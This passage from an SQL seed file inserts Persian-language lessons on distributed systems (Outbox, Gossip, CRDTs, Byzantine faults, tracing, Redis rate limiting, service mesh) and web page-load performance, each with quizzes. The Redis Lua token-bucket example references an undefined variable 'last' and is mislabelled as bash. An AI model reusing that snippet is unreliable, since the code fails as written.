آشتی.","اسپنر «حقیقت یگانه جهانی» را حل می‌کند: برای موجودی، ۱۵ms صبرِ اتمی می‌ارزد چون فروش دوبرابر فاجعه است.","نکته کل درس: هر سه «درست»‌اند — چون هر کدام برای بخش متفاوتی از همین خرید ساخته شده‌اند. معماری یعنی تقسیم سوال، نه انتخاب یک جواب برای همه."]},{"k":"def","term":"ISR (In-Sync Replicas)","t":"در کافکا، زیرمجموعه‌ای از کپی‌های یک Partition که واقعاً همگام با رهبرند و فقط آن‌ها در انتخاب رهبر جدید شرکت می‌کنند و (با acks=all) باید نوشتن را تأیید کنند. کپی‌ای که عقب بیفتد از ISR خارج می‌شود — تا روزی که رهبر بمیرد و انتخاب از بین «به‌روزها» باشد، نه از بین «همه». ترکیب min.insync.replicas=2 و acks=all همان فرمول «نه گم شدن، نه توقف» است."},{"k":"table","head":["سیستم","انتخاب اصلی","مکانیزم کلیدی","بهترین جا"],"rows":[["Kafka","لاگ دائمی + ترتیب در Partition","offset، ISR، acks","ستون فقرات رویدادها"],["Cassandra","AP؛ نوشتن همیشه موفق","Gossip، هش سازگار، LWW","داده حجیم، تحمل دیتاسنتر"],["Spanner","CP جهانی با سازگاری خارجی","TrueTime، Commit-Wait","تراکنش مالی چندقاره‌ای"]]},{"k":"warn","title":"دام رایج","t":"کپی‌کردن «معماری نتفلیکس/اوبر» بدون داشتن مسئله‌شان: کافکا برای روزی صد پیام و سه مصرف‌کننده، کاساندرا برای داده‌ای که تراکنش لازم دارد، اسپنر برای اپی که یک دیتاسنترش کافی است. هر سه سیستم، جواب‌های درستی‌اند به سوال‌هایی که احتمالاً تو نداری — و هزینه‌شان (عملیات، تأخیر، محدودیت مدل داده) از روز اول روی دوشت می‌نشیند. اول مسئله را اندازه بگیر، بعد ابزار را."},{"k":"tip","title":"نکته حرفه‌ای","t":"برای هر کدام از این سه، یک عصر وقت بگذار و «مقاله اصلی‌اش» را بخوان: Kafka (The Log — جی کِرپس)، Dynamo (آمازون، ۲۰۰۷) و Spanner (گوگل، ۲۰۱۲). این سه مقاله به‌اضافه Raft، عملاً چهار ستون سواد سیستم‌های توزیع‌شده مدرن‌اند — و خواندن‌شان تو را در هر مصاحبه‌ای از «کسی که استفاده کرده» به «کسی که می‌فهمد چرا این‌طور است» ارتقا می‌دهد."},{"k":"h","t":"جمع‌بندی درس"},{"k":"list","items":["کافکا: ترتیب در Partition + تاریخچه دائمی + ISR برای دوام — ستون فقرات رویدادمحور.","کاساندرا: AP با Gossip و هش سازگار و Quorum قابل‌تنظیم — دسترس‌پذیری حتی با مرگ دیتاسنتر.","اسپنر: سازگاری جهانی با TrueTime و Commit-Wait — خریدنِ سازگاری با سرمایه‌گذاری روی زیرساخت."]}]'::jsonb, '[{"q":"چرا کافکا ترتیب را فقط داخل هر Partition تضمین می‌کند؟","opts":["به‌خاطر سرعت","چون Partitionها بین Brokerها مستقل پردازش می‌شوند و ترتیب سراسری نیاز به یک هماهنگ‌کننده مرکزی دارد — که کافکا عمداً ندارد","اشتباه طراحی است","به‌خاطر فشرده‌سازی"],"ans":1,"why":"ترتیب جهانی یعنی گلوگاه مرکزی؛ کافکا با Partitioning مقیاس می‌گیرد و ترتیب را جایی تضمین می‌کند که معنی دارد: بین رویدادهای یک کلید (با کلید یکسان به یک Partition)."},{"q":"LWW در کاساندرا چه مسئله‌ای را و به چه قیمتی حل می‌کند؟","opts":["ترافیک را، به‌قیمت سرعت","تعارض نوشتن‌های همزمانِ جداافتاده را، به‌قیمت این‌که «برنده» آخرین زمان‌برچسب است — نه لزوماً درست‌ترین مقدار","امنیت را، به‌قیمت کلید","هیچ‌کدام"],"ans":1,"why":"وقتی دو گره جداشده همزمان یک ستون را نوشتند و بعد آشتی کردند، یکی باید ببرد؛ LWW ساده‌ترین داور است ولی یعنی مدل داده‌ات باید با «آخرین برنده است» سازگار باشد — مثل به‌روزرسانی مستقل ستون‌ها."},{"q":"Commit-Wait در اسپنر چه چیزی می‌خرد؟","opts":["سرعت","سازگاری خارجی: با صبرِ به‌اندازه بازه اطمینان ساعت، تضمین می‌شود ترتیب Commitها در همه‌جا یکسان دیده می‌شود","فشرده‌سازی","افزونگی"],"ans":1,"why":"چون ساعت بازه خطا دارد، اسپنر چند میلی‌ثانیه صبر می‌کند تا «گذشته» واقعاً گذشته شود — و بعد از آن، هیچ تراکنش جدیدی نمی‌تواند در جای دیگر، قبل از آن Commit شود. میلی‌ثانیه صبر در برابر سازگاری جهانی."}]'::jsonb),
('ds-c1', 'dist', 'الگوی Outbox؛ انتشار رویدادِ قابل‌اعتماد', 45, 11, '[{"k":"p","t":"مسئله کلاسیک: سفارش را در دیتابیس ذخیره کردی ولی انتشار رویدادش به کافکا شکست خورد (یا برعکس — رویداد رفت ولی Commit نشد). چون دیتابیس و کافکا یک تراکنش مشترک ندارند، «هر دو یا هیچ‌کدام» رایگان نیست. راه‌حل Outbox: رویداد را به‌جای فرستادن، در جدول outbox همان دیتابیس و در همان تراکنش بنویس — حالا ذخیره و رویداد اتمیک‌اند. بعد یک ناشرِ جدا (پروسه یا Debezium روی لاگ تراکنش) ردیف‌های outbox را می‌خواند و به کافکا می‌فرستد. تحویل حداقل‌یک‌بار است — پس مصرف‌کننده باید Idempotent باشد."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["رویداد در همان تراکنشِ کسب‌وکار، در جدول outbox ذخیره می‌شود","ناشر جداگانه (یا Debezium/CDC) آن را به کافکا می‌برد","تحویل حداقل‌یک‌بار → مصرف‌کننده Idempotent","ردیف‌های فرستاده‌شده را با تاخیر پاک کن، نه بلافاصله"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"sql","title":"Outbox در عمل","code":"BEGIN;\n  INSERT INTO orders (id, total, status)\n  VALUES (42, 850000, ''CREATED'');\n\n  INSERT INTO outbox (topic, key, payload)\n  VALUES (''orders'', ''42'',\n    ''{\"type\":\"OrderCreated\",\"id\":42}'');\nCOMMIT;\n-- هر دو یا هیچ‌کدام. ناشر، بقیه راه را می‌رود."},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: رویداد در همان تراکنشِ کسب‌وکار، در جدول outbox ذخیره می‌شود بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا Outbox مشکل «رویداد گم‌شده» را حل می‌کند؟","opts":["چون کافکا را حذف می‌کند","چون ذخیره داده و ثبت رویداد را در «یک» تراکنش دیتابیس اتمیک می‌کند — گم‌شدن فقط قبل از Commit ممکن است که آن هم یعنی کلاً انجام نشده","چون سریع‌تر است","چون رمزنگاری می‌کند"],"ans":1,"why":"اتمیک بودن کل ماجراست: یا هر دو ماندند یا هیچ‌کدام؛ ناشر بعدی فقط انتقال می‌دهد و اگر بمیرد، ردیف‌ها هنوز آن‌جایند."}]'::jsonb),
('ds-c2', 'dist', 'پروتکل Gossip؛ شایعه به‌جای دفتر مرکزی', 40, 12, '[{"k":"p","t":"در خوشه‌های بزرگ بدون رهبر (کاساندرا، Consul، عضویت‌های سرویس)، سوال این است: هر گره چطور بفهمد چه کسی زنده است و متادیتای کی جدید است — بدون یک سرور مرکزی که خودش تک‌نقطه شکست شود؟ Gossip جواب است: هر گره هر ثانیه چند گره تصادفی را صدا می‌زند و هرچه می‌داند را با آن‌ها مبادله می‌کند — مثل پخش شایعه. اطلاعات به‌صورت نمایی پخش می‌شود (هر گیرنده، ناقل می‌شود) و در O(log N) دور به همه می‌رسد؛ و چون مبادله «نسخه‌دار» است، تکرارها خودبه‌خود نادیده گرفته می‌شوند. کاساندرا برای تشخیص مرگ هم از همین جریان استفاده می‌کند: Phi Accrual Failure Detector به‌جای «مرده/زنده» صفر و یکی، «احتمال مرده‌بودن» پیوسته تولید می‌کند — چون در دنیای واقعی، گره‌ها گاهی فقط کندند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["هر گره با چند همسایه تصادفی در هر دور، حالت را مبادله می‌کند","پخش نمایی: در ~log(N) دور همه‌گیر می‌شود","داده نسخه‌دار → تکرار و بی‌نظمی خودبه‌خود حل می‌شود","Phi Accrual: مرگ «احتمال» است نه باینری"]},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: هر گره با چند همسایه تصادفی در هر دور، حالت را مبادله می‌کند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا Gossip به سرور مرکزی نیاز ندارد و بااین‌حال همه‌گیر می‌شود؟","opts":["چون سریع است","چون هر گره‌ای که خبر را گرفت خودش ناقل می‌شود — پخش نمایی، و نسخه‌ها تضمین می‌کنند همه به جدیدترین برسند","چون UDP است","نیاز دارد"],"ans":1,"why":"مثل شایعه: ۱→۳→۹→۲۷… و چون هر خبر شماره نسخه دارد، شنیدنِ دوباره‌اش بی‌اثر است — هم‌گرایی بدون هماهنگ‌کننده."}]'::jsonb),
('ds-c3', 'dist', 'CRDT؛ داده‌ای که خودش آشتی می‌کند', 45, 13, '[{"k":"p","t":"اگر هر کپی داده بتواند بدون هماهنگی بنویسد و بعداً هر جفت کپی، بدون از دست دادن چیزی آشتی کند چه؟ CRDT (انواع داده تکرارشوندهِ همگرا) دقیقاً همین را تضمین می‌کند — با طراحی ریاضی: عملیاتش جابه‌جایی‌پذیر، شرکت‌پذیر و Idempotent‌اند. G-Counter فقط افزایش می‌یابد و آشتی‌اش max هر خانه است؛ LWW-Element-Set برای هر عنصر زمان حذف/افزودن نگه می‌دارد و آخری برنده است؛ و متن‌های همزمانِ مشترک (مثل Google Docs) روی خانواده‌های RGA/CVOT سوارند. CRDTها قلب سیستم‌های آفلاین-اول‌اند: یادداشت‌های Notion و Figma آفلاین، هر کجا که باشی می‌نویسی و وقتی وصل شدی، بدون «تعارضِ حل‌کردنی» ادغام می‌شود — چون تعریفِ داده، تعارض را ناممکن کرده."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["عملیات CRDT: جابه‌جایی‌پذیر + شرکت‌پذیر + Idempotent","آشتی با Merge ریاضی — بدون مذاکره و بدون گم‌شدن","کاربرد طلایی: آفلاین-اول و همکاری همزمان","هزینه: متادیتا و محدودیت مدل داده — فقط عملیات‌های خاصی می‌شوند CRDT"]},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: عملیات CRDT: جابه‌جایی‌پذیر + شرکت‌پذیر + Idempotent بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"CRDT چه چیزی را که حل تعارض سنتی ندارد، ارائه می‌دهد؟","opts":["سرعت شبکه","هم‌گرایی تضمین‌شده بدون مذاکره: هر دو کپی با Merge محلی به یک نتیجه یکسان می‌رسند — تعارض اصلاً رخ نمی‌دهد","رمزنگاری","فشرده‌سازی"],"ans":1,"why":"در راه‌حل سنتی، تعارض رخ می‌دهد و بعد «حلش می‌کنی» (با انسان یا LWW). در CRDT، ریاضیاتِ عملیات طوری است که ادغام همیشه یکتا و کامل است — مسئله از اساس حذف شده."}]'::jsonb),
('ds-c4', 'dist', 'مسئله ژنرال‌های بیزانسی؛ وقتی گره‌ها دروغ می‌گویند', 50, 14, '[{"k":"p","t":"تا اینجا خرابی گره‌ها «سقوط» بود: یا درست کار می‌کنند یا ساکت می‌شوند (Crash Fault). ژنرال‌های بیزانسی سناریوی ترسناک‌تر است: گره‌هایی که زنده‌اند ولی دروغ می‌گویند — پیام متناقض می‌فرستند، به هر کس یک چیز می‌گویند (Byzantine Fault). لمپورت ثابت کرد برای تحمل f گره خیانتکار به حداقل 3f+1 گره نیاز است (۴ برای یک خیانتکار) و الگوریتم PBFT عملاً‌اش کرد. چرا اینقدر گران؟ چون هر پیام باید امضا و بازتأیید شود تا دروغِ یک گره نتواند بقیه را فریب دهد. بلاکچین‌ها همین مسئله را با اجماع‌های گران‌تر (Proof of Work/Stake) در مقیاس اینترنت حل می‌کنند — و چرا سیستم‌های سنتی (etcd با Raft) از آن فرار می‌کنند: در دیتاسنتر خودت، گره‌ها یا کار می‌کنند یا می‌میرند؛ دروغ نمی‌گویند. پس اول بپرس: آیا واقعاً به تحمل بیزانس نیاز دارم؟"},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["Crash Fault: ساکت می‌شود — Byzantine: دروغ می‌گوید","تحمل f خیانتکار نیازمند حداقل 3f+1 گره است","Raft/Paxos فقط Crash را تحمل می‌کنند — و برای دیتاسنتر کافی است","بلاکچین یعنی تحمل بیزانس بین غریبه‌ها — با هزینه انرژی/سهیم"]},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: Crash Fault: ساکت می‌شود — Byzantine: دروغ می‌گوید بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا تحمل خطای بیزانسی به 3f+1 گره نیاز دارد؟","opts":["قرارداد است","چون با f دروغگو باید اکثریتی یافت که هم راست‌گوها در آن اکثریت باشند و هم دروغ‌ها نتوانند دو روایت متضادِ باورپذیر بسازند — ریاضیاتش حداقل 3f+1 می‌دهد","برای سرعت","3f کافی است"],"ans":1,"why":"با 3f+1، حتی اگر f دروغگو همه پیام‌ها را خراب کنند، باز 2f+1 راست‌گو می‌مانند که اکثریت است و دو روایت متضاد نمی‌توانند هر دو اکثریت بگیرند."}]'::jsonb)
INSERT INTO lessons (id, course_id, title, minutes, sort_order, blocks, quiz) VALUES
('ds-c5', 'dist', 'ردیابی توزیع‌شده؛ دیدن سفر یک درخواست', 40, 15, '[{"k":"p","t":"وقتی یک درخواست از ۶ سرویس رد می‌شود و «کند است»، لاگ‌های ۶ ماشین جدا هیچ‌وقت به‌تنهایی جواب نمی‌دهند — چون هیچ‌کدام نمی‌داند ماجرای کامل چیست. Distributed Tracing راه‌حل است: هر درخواست یک Trace ID می‌گیرد که در همه سرویس‌ها propagate می‌شود؛ هر سرویس کار خودش را به‌شکل Span (با نام، زمان شروع/پایان و برچسب‌ها) ثبت می‌کند و Spanها با روابط والد-فرزندی، درختِ کامل سفر را می‌سازند. OpenTelemetry استاندارد امروز است و ابزارهایی مثل Jaeger و Tempo این درخت‌ها را ترسیم می‌کنند — و ناگهان می‌بینی آن ۳ ثانیه، ۲٫۸ ثانیه‌اش در یک Query بی‌ایندکس در سرویس موجودی بوده. چون حجم بالاست، نمونه‌گیری (Sampling) لازم است: مثلاً ۱٪ عادی + ۱۰۰٪ درخواست‌های خطادار یا کند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["Trace ID واحد در همه سرویس‌ها — با هدر propagate می‌شود","Span: واحد کار؛ درخت Spanها = سفر کامل درخواست","OpenTelemetry برای سازش، Jaeger/Tempo/Grafana برای نمایش","نمونه‌گیری هوشمند: همه خطاها و کُندی‌ها، بقیه درصدی"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"py","title":"Span با OpenTelemetry","code":"from opentelemetry import trace\n\ntracer = trace.get_tracer(''orders'')\n\nwith tracer.start_as_current_span(''create-order'') as span:\n    span.set_attribute(''user.id'', user_id)\n    with tracer.start_as_current_span(''charge-payment''):\n        payment.charge(user_id, total)   # ← اگر کند باشد،\n    with tracer.start_as_current_span(''reserve-stock''):\n        stock.reserve(items)             #    همین‌جا پیدایش می‌کنی"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: Trace ID واحد در همه سرویس‌ها — با هدر propagate می‌شود بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"بدون Tracing، پیدا کردن «کجای زنجیره کند است» چرا عملاً غیرممکن است؟","opts":["چون لاگ نداریم","چون هر سرویس فقط تکه خودش را می‌بیند و هیچ لاگی نمی‌داند این درخواست همانی است که در سرویس قبلی بود — Trace ID این تکه‌ها را به یک ماجرا وصل می‌کند","چون شبکه کند است","ممکن است"],"ans":1,"why":"بدون شناسه مشترک، باید با حدسِ زمانی لاگ‌ها را کنار هم بچینی — که زیر بار واقعی غیرقابل‌اعتماد است. Trace ID رشته‌ای است که همه مهره‌ها را به هم وصل می‌کند."}]'::jsonb),
('ds-c6', 'dist', 'Rate Limiting توزیع‌شده؛ Token Bucket با Redis', 40, 16, '[{"k":"p","t":"وقتی API پشت چند سرور است، محدودیت «۱۰۰ درخواست در دقیقه» نمی‌تواند محلی باشد — هر سرور سهم خودش را بشمارد، عملاً N برابر مجاز می‌شود. راه‌حل: شمارنده مشترک در Redis. الگوی Token Bucket ساده و قوی است: یک سطل با ظرفیت ثابت که با نرخ ثابت پر می‌شود؛ هر درخواست یک سکه برمی‌دارد و اگر سطل خالی بود، 429 برمی‌گردد — که هم میانگین را محدود می‌کند هم اجازه Burst کوتاه می‌دهد. نکته حیاتی: بررسی و کم‌کردن سکه باید «اتمی» باشد — که با یک اسکریپت Lua در Redis انجام می‌شود (Redis اسکریپت را اتمیک اجرا می‌کند)، نه با GET-then-SET که بینش شرط رقابتی می‌افتد. و برای دقت بیشتر در مرزها، Sliding Window Log جایگزین پنجره‌های ثابت است تا مشکل «دو برابر شدن در مرز دو پنجره» پیش نیاید."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["شمارنده مشترک در Redis — نه حافظه محلی هر سرور","Token Bucket: پرشدن با نرخ ثابت + اجازه Burst","عملیات «بردار و کم کن» باید اتمیک باشد → Lua","پنجره ثابت مشکل مرز دارد → Sliding Window"]},{"k":"h","t":"مثال عملی"},{"k":"code","lang":"bash","title":"اسکریپت Lua اتمیک (RATE_LIMIT.lua)","code":"-- KEYS[1]=سطل  ARGV[1]=ظرفیت ARGV[2]=نرخ/ثانیه ARGV[3]=اکنون\nlocal tokens = tonumber(redis.call(''GET'', KEYS[1]) or ARGV[1])\ntokens = math.min(ARGV[1], tokens + (ARGV[2] * (ARGV[3] - last)))\nif tokens < 1 then\n  return 0   -- → 429 Too Many Requests\nend\nredis.call(''SET'', KEYS[1], tokens - 1)\nreturn 1     -- → اجازه عبور"},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: شمارنده مشترک در Redis — نه حافظه محلی هر سرور بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا GET و بعد SET برای Rate Limiting خطرناک است؟","opts":["کند است","چون بین خواندن و نوشتن، درخواست‌های سرورهای دیگر هم می‌توانند بخوانند — شرط رقابتی، و همه با «هنوز جا هست» عبور می‌کنند","Redis اجازه نمی‌دهد","خطرناک نیست"],"ans":1,"why":"دو سرور همزمان عدد ۱ را می‌خوانند، هر دو نتیجه می‌گیرند جا هست، هر دو کم می‌کنند — و محدودیت عملاً دو برابر شده. اتمیک‌کردن (Lua) یعنی خواندن و کم‌کردن یک عمل indivisible است."}]'::jsonb),
('ds-c7', 'dist', 'Service Mesh؛ زیرساخت به‌جای کتابخانه', 45, 17, '[{"k":"p","t":"Timeout، Retry، فیوزبردار، mTLS، لاگ و متریک — هر کدام را می‌شود با کتابخانه داخل کد آورد، ولی آن‌وقت هر سرویس (پایتون، Go، Node) نسخه خودش را دارد و ارتقای منطق شبکه یعنی ارتقای صد سرویس. Service Mesh این دغدغه‌ها را از کد بیرون می‌کشد: کنار هر Pod یک Sidecar (مثل Envoy) می‌نشیند و همه ترافیک ورودی و خروجی از آن رد می‌شود — پس Retry، مخابرات امن با mTLS خودکار، تقسیم ترافیک برای Canary و Observability، بدون حتی یک خط تغییر در برنامه اعمال می‌شود. Istio و Linkerd دو پیاده‌سازی اصلی‌اند. ولی Mesh رایگان نیست: هر بسته شبکه دو پرش اضافه دارد، عملیاتش پیچیده است و برای ده سرویس اول معمولاً زیاده‌روی است — وقتی بیست‌وتای سرویس و چند زبان داری، تازه Mesh شروع می‌کند به صرفه‌دادن."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["Sidecar کنار هر سرویس، همه ترافیک را کنترل می‌کند","Retry، TLS، Canary و متریک — بدون تغییر کد برنامه","mTLS بین سرویس‌ها به‌صورت خودکار","هزینه: پیچیدگی عملیاتی و تأخیر — برای شروع کار زیاده‌روی است"]},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: Sidecar کنار هر سرویس، همه ترافیک را کنترل می‌کند بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"Service Mesh چه چیزی را از معماری حذف می‌کند؟","opts":["نیاز به شبکه","وابستگیِ منطق ارتباطی (Retry، TLS، مانیتورینگ) به کتابخانه داخلِ هر سرویس — و ارتقای صدجا را به یک ارتقا تبدیل می‌کند","نیاز به Kubernetes","همه مشکلات"],"ans":1,"why":"وقتی منطق شبکه در Sidecar متمرکز باشد، تغییر سیاست Retry یا چرخش گواهی، یک تغییر زیرساختی است نه صد تغییر کدی — و هر زبانی بی‌نصیب نمی‌ماند."}]'::jsonb),
('ds-c8', 'dist', 'پخش بار جهانی؛ کاربران را به نزدیک‌ترین خودت ببر', 40, 18, '[{"k":"p","t":"یک دیتاسنتر یعنی فاصله فیزیکی با همه — و فاصله یعنی تأخیر و یک نقطه مرگ. پخش بار جهانی (Global Load Balancing) ترافیک را بین دیتاسنترها تقسیم می‌کند: یا با DNS (هر منطقه IP نزدیک‌ترین دیتاسنتر را می‌گیرد — ساده ولی وابسته به TTL کش DNS)، یا با Anycast (یک IP واحد که در همه‌جا اعلام می‌شود و مسیریاب‌های اینترنت خودشان به نزدیک‌ترین می‌برند — همان کاری که Cloudflare و DNSهای ریشه می‌کنند)، یا با لایه‌بالا (Health Check و هدایت بر اساس تأخیر واقعی). و سوال بزرگ‌تر از «چطور»، «چند دیتاسنتر فعال» است: Active-Passive یعنی یکی کار می‌کند و بقیه آماده‌اند (ساده‌تر ولی ظرفیت خوابیده) و Active-Active یعنی همه همزمان سرویس می‌دهند (ظرفیت کامل ولی مسئله‌های سازگاری داده بین مناطق — همان درس‌های Replication و Quorum). اکثر شرکت‌ها با Active-Passive شروع و وقتی ترافیک جدی شد به Active-Active می‌روند."},{"k":"h","t":"آنچه باید بدانید"},{"k":"list","items":["DNS-based: ساده، وابسته به TTL و کش کلاینت","Anycast: مسیریابی شبکه تصمیم می‌گیرد — برای پروتکل‌های بی‌حالت عالی","Active-Passive: ساده‌تر، ظرفیت خوابیده — Active-Active: ظرفیت کامل، داده سخت‌تر","Health Check جهانی: دیتاسنتر خراب از DNS/مسیر حذف می‌شود"]},{"k":"h","t":"جمع‌بندی"},{"k":"p","t":"برداشت اصلی این درس: DNS-based: ساده، وابسته به TTL و کش کلاینت بقیه درس‌های دوره همین ایده را عمیق‌تر می‌کنند؛ قبل از ادامه، پرسش‌های زیر را پاسخ بده تا مطمئن شوی مفهوم نشسته است."}]'::jsonb, '[{"q":"چرا Active-Active جهانی سخت‌تر از Active-Passive است؟","opts":["گران‌تر است","چون هر دو منطقه همزمان می‌نویسند — و حالا سازگاری داده بین مناطق (همان CAP/Quorum) مسئله روزمره است، نه روز فاجعه","کندتر است","نیاز به DNS دارد"],"ans":1,"why":"در Passive منطقه پشتیبان چیزی نمی‌نویسد که بخواهد آشتی شود؛ در Active-Active هر نوشتن باید تصمیم داشته باشد: همگامِ دور (کند) یا نهایتی (ناسازگاری موقت) — و این تصمیم را باید برای هر داده جدا بگیری."}]'::jsonb),
('web-r1', 'web', 'از URL تا پیکسل؛ کالبدشکافی بارگذاری صفحه', 65, 1, '[{"k":"p","t":"آدرس را می‌زنی و Enter؛ چند صد میلی‌ثانیه بعد صفحه آن‌جاست. در این فاصله، یک زنجیره مهندسیِ شگفت‌انگیز اجرا می‌شود — DNS و TCP و TLS، بعد پارس HTML و CSS، محاسبه چیدمان و در نهایت نقاشی پیکسل‌ها. کسی که این زنجیره را می‌فهمد، می‌داند سرعت واقعاً کجا گم می‌شود."},{"k":"h","t":"سفر درخواست؛ قبل از رسیدن به کد"},{"k":"p","t":"همه‌چیز با ترجمه نام شروع می‌شود: مرورگر از کش خودش، سیستم‌عامل و بعد سرورهای DNS می‌پرسد که example.com چه IPای دارد. بعد یک اتصال TCP با دست‌دادن سه‌راهی ساخته می‌شود و اگر HTTPS باشد، TLS روی آن سوار می‌شود — همه این‌ها قبل از ارسال حتی یک بایت درخواست. به همین دلیل اتصال اول همیشه کندترین است و HTTP/2 و HTTP/3 با اتصال‌های ماندگار و چندمسیره‌ای، این هزینه را بین ده‌ها درخواست تقسیم می‌کنند. وقتی بالاخره پاسخ HTML می‌رسد، کار اصلی مرورگر شروع می‌شود."},{"k":"h","t":"مسیر رندر بحرانی؛ جایی که صفحه ساخته می‌شود"},{"k":"p","t":"مرورگر HTML را می‌خواند و درخت DOM را می‌سازد؛ همزمان CSS را پارس می‌کند و درخت CSSOM. ترکیب این دو، درخت رندر است — فقط عناصر قابل‌دیدن. بعد Layout اندازه و جای هر عنصر را حساب می‌کند، Paint پیکسل‌ها را می‌کشد و Composite لایه‌ها را روی GPU روی هم می‌گذارد. نکته حیاتی: CSS «مسدودکننده رندر» است — تا CSSOM کامل نشود، صفحه نقاشی نمی‌شود؛ ولی JS می‌تواند «مسدودکننده پارس» باشد چون ممکن است با document.write ساختار را عوض کند. پس استراتژی: CSS کوچک و حیاتی را زود برسان، JS را با defer به انتهای پارس بینداز و تصاویر غیرحیاتی را lazy کن."},{"k":"h","t":"بودجه عملکرد؛ چرا هر میلی‌ثانیه حساب می‌شود"},{"k":"p","t":"کاربرها صبر ندارند و موتورهای جست‌وجو هم همین‌طور. معیارهای گوگل روشن‌اند: LCP (بزرگ‌ترین محتوای قابل‌دیدن) زیر ۲٫۵ ثانیه، INP (پاسخ به تعامل) زیر ۲۰۰ میلی‌ثانیه و CLS (جابه‌جایی چیدمان) زیر ۰٫۱. رسیدن به این اعداد یعنی اولویت‌بندی: فونت با font-display: swap، تصویر Hero با fetchpriority=\"high\"، بقیه با loading=\"lazy\"، و جاوااسکریپت غیرحیاتی بعد از تعامل کاربر (hydration تدریجی). صفحه سریع، یک ویژگی نیست — نتیجه ده تصمیم کوچک درست است."},{"k":"h","t":"مثال حل‌شده"},{"k":"code","lang":"html","title":"یک سرِ سالم برای شروع سریع","code":"<!DOCTYPE html>\n<html lang=\"fa\" dir=\"rtl\">\n<head>\n  <meta charset=\"UTF-8\">\n  <!-- بدون این خط، ریسپانسیو بودن اصلاً شروع نمی‌شود -->\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n\n  <!-- CSS حیاتی: کوچک و inline یا prefetch -->\n  <link rel=\"stylesheet\" href=\"critical.css\">\n  <link rel=\"preload\" href=\"app.css\" as=\"style\"\n        onload=\"this.rel=''stylesheet''\">\n\n  <!-- جاوااسکریپت: پارس را مسدود نکن -->\n  <script defer src=\"app.js\"></script>\n</head>\n<body>\n  <img src=\"hero.avif\" fetchpriority=\"high\" alt=\"...\">\n  <img src=\"gallery-1.avif\" loading=\"lazy\" alt=\"...\">\n</body>\n</html>"},{"k":"list","items":["viewport متا به مرورگر موبایل می‌گوید عرض واقعی دستگاه را مبنا بگیر — بدون آن، همه رسانه‌ها در عرض ۹۸۰ پیکسل رندر می‌شوند و ریسپانسیو بودن بی‌معنی است.","تکنیک preload + onload: فایل CSS غیرحیاتی اول با اولویت بالا دانلود می‌شود ولی رندر را مسدود نمی‌کند؛ بعد از بارگذاری اعمال می‌شود.","defer یعنی «دانلود کن ولی بعد از پارس کامل HTML اجرا کن، به ترتیب» — برای اکثر اسکریپت‌ها انتخاب درست است.","تصویر Hero با fetchpriority بالا و بقیه lazy — یعنی پهنای باند و CPU اول صرف چیزی می‌شود که کاربر واقعاً می‌بیند."]},{"k":"def","term":"مسیر رندر بحرانی (Critical Rendering Path)","t":"زنجیره‌ی تبدیل کد به پیکسل: DOM ← CSSOM ← درخت رندر ← Layout ← Paint ← Composite. هر چه این مسیر کوتاه‌تر و سبک‌تر باشد، اولین نقاشی زودتر اتفاق می‌افتد — و تمام بهینه‌سازی‌های فرانت‌اند، در واقع کوتاه‌کردن یا سبک‌کردن یکی از حلقه‌های همین زنجیره‌اند."},{"k":"table","head":["نحوه بارگذاری اسکریپت","پارس HTML","زمان اجرا"],"rows":[["<script>","مسدود می‌شود","همان لحظه"],["<script defer>","ادامه دارد","بعد از پارس کامل، به ترتیب"],["<script async>","ادامه دارد","به‌محض دانلود — ترتیب تضمین نیست"],["<script type=\"module\">","ادامه دارد","defer پیش‌فرض است"]]},{"k":"warn","title":"دام رایج","t":"قرار دادن <script>های سنگین در <head> بدون defer یا async — پارس HTML وسط صفحه متوقف می‌شود و کاربر چند ثانیه صفحه سفید می‌بیند. این هنوز رایج‌ترین اشتباه عملکردی وب فارسی است؛ یک کلمه defer اغلب ثانیه‌ها صرفه‌جویی می‌کند."},{"k":"tip","title":"نکته حرفه‌ای","t":"تب Performance دیوتولز کروم را باز کن و waterfall اولین بارگذاری سایتت را ببین: میله‌های بنفش یعنی Layout، زرد یعنی JS، سبز یعنی Paint. قبل از هر بهینه‌سازی، ببین زمان واقعاً کجا می‌رود — حدس نزن، اندازه 